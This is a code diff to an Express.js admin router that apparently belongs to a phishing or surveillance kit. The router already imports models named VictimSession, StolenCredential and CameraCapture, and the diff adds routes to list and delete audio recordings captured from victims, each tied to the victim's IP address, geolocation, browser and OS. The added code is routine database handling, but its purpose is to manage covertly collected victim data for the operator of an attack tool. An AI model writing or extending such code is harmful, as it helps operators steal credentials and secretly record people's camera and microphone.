@@ -3,6 +3,7 @@ const router = express.Router();
 const VictimSession = require('../models/VictimSession');
 const StolenCredential = require('../models/StolenCredential');
 const CameraCapture = require('../models/CameraCapture');
+const AudioCapture = require('../models/AudioCapture');
 const ClickEvent = require('../models/ClickEvent');
 const User = require('../models/User');
 const AppSettings = require('../models/AppSettings');
@@ -747,6 +748,51 @@ router.get('/camera-captures/recover', async (req, res) => {
       orphanCapturesFixed: orphanCaptures.filter(o => o.reason === 'fixed_missing_reference').length,
       orphanDetails: orphanCaptures
     });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// GET /api/admin/audio-captures - List all audio captures
+router.get('/audio-captures', async (req, res) => {
+  try {
+    const { page = 1, limit = 20, sessionId } = req.query;
+    const skip = (parseInt(page) - 1) * parseInt(limit);
+    const query = {};
+    if (sessionId) query.sessionId = sessionId;
+
+    const [captures, total] = await Promise.all([
+      AudioCapture.find(query)
+        .sort({ capturedAt: -1 })
+        .skip(skip)
+        .limit(parseInt(limit))
+        .populate({ path: 'sessionId', select: 'ipAddress geolocation browser os sessionId' })
+        .lean(),
+      AudioCapture.countDocuments(query)
+    ]);
+
+    res.json({
+      captures,
+      pagination: { page: parseInt(page), limit: parseInt(limit), total, pages: Math.ceil(total / parseInt(limit)) }
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// DELETE /api/admin/audio-captures/:id - Delete a single audio capture
+router.delete('/audio-captures/:id', async (req, res) => {
+  try {
+    const capture = await AudioCapture.findByIdAndDelete(req.params.id);
+    if (!capture) return res.status(404).json({ error: 'Audio capture not found' });
+
+    let cloudinaryResult = null;
+    if (capture.cloudinaryPublicId) {
+      cloudinaryResult = await deleteImage(capture.cloudinaryPublicId);
+      console.log(`🗑️ Deleted audio from Cloudinary [${capture.cloudinaryPublicId}]:`, cloudinaryResult);
+    }
+
+    res.json({ message: 'Audio capture deleted', cloudinaryDeleted: cloudinaryResult?.success || false });
   } catch (error) {
     res.status(500).json({ error: error.message });
   }
